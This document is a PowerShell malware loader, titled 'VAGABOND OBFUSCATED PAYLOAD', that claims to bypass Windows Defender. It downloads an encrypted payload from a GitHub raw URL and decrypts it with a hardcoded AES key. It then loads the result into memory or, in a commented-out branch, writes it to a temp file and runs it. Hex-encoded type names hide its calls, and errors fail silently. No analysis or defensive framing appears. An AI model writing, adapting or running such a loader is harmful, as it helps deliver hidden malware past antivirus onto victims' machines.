# VAGABOND OBFUSCATED PAYLOAD - Bypass Windows Defender
# ----------------------------------------
# Purpose: Download, decrypt, and execute payload from GitHub
# Method: In-memory execution with AES-256 decryption
# ----------------------------------------

# REPLACE THIS WITH YOUR ACTUAL RAW GITHUB URL
$gH = "https://raw.githubusercontent.com/brakedangola2/vagabond/refs/heads/main/payload.ps1" 

$kY = [System.Text.Encoding]::UTF8.GetBytes("PhantomKey1234567890123456789012")
$iv = [System.Text.Encoding]::UTF8.GetBytes("1234567890123456")

# Hex-encoded string for "System.Text.Encoding"
$sT = [char[]](0x53,0x79,0x73,0x74,0x65,0x6d,0x2e,0x54,0x65,0x78,0x74,0x2e,0x45,0x6e,0x63,0x6f,0x64,0x69,0x6e,0x67) -join ""

# Hex-encoded string for "UTF8"
$tU = [char[]](0x55,0x54,0x46,0x38) -join ""

# Get encoding object
$enc = [Type]::GetType($sT).GetMethod("GetEncoding").Invoke($null, @($tU))

# Function to decrypt data
function D-Crypt {
    param([byte[]]$d, [string]$k)
    $h = New-Object System.Security.Cryptography.SHA256CryptoServiceProvider
    $kb = $h.ComputeHash($enc.GetBytes($k))
    $a = New-Object System.Security.Cryptography.AesManaged
    $a.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $a.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
    $a.KeySize = 256
    $a.Key = $kb
    if ($d.Length -gt 16) {
        $iv = $d[0..15]
        $a.IV = $iv
        $dNoIV = $d[16..($d.Length-1)]
        $dec = $a.CreateDecryptor()
        return $dec.TransformFinalBlock($dNoIV, 0, $dNoIV.Length)
    }
    return $d
}

# Function to download data
function G-Data {
    param([string]$u)
    $wc = New-Object System.Net.WebClient
    return $wc.DownloadData($u)
}

# Main Execution Flow
try {
    # Download encrypted payload
    $rD = G-Data -u "$gH"
    
    # Decrypt payload
    $pL = D-Crypt -d $rD -k $kY
    
    # Execute payload in memory
    [System.Reflection.Assembly]::Load($pL) | Out-Null
    
    # If it's an EXE, use this instead:
    # $tempFile = [System.IO.Path]::GetTempFileName()
    # [System.IO.File]::WriteAllBytes($tempFile, $pL)
    # Start-Process $tempFile
} catch {
    # Silent failure
}
